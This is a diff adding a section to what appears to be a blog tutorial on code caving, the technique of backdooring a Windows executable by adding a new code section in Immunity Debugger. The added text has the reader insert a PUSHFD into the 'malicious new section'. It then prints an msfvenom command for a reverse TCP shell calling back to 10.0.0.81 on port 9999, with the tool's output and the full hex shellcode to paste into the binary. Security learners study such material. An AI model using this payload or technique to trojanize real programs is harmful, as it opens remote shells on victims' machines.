@@ -36,5 +36,19 @@ Now you can press `F7` and step into the newly edited JMP call, this will lead t
 
 ![code caving 6](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_6.png)
 
+Now you also want to edit the new section in Immunity and add a `PUSHFD` to the start of your malicious new section. Assemble it when done.
+
+Now you can generate your msfvenom payload, use a EXITFUN=seh to ensure it handles proper exiting to add to the stability and reliability of your shell. Generate it in hex format you you can now copy past this into Immunity Debugger into your new malicious section.
+
+```
+└─▪ ./msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.81 LPORT=9999 -f hex EXITFUNC=seh
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of hex file: 648 bytes
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a05680a000051680200270f89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbfe0e32ea68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
+```
+
 
 ----
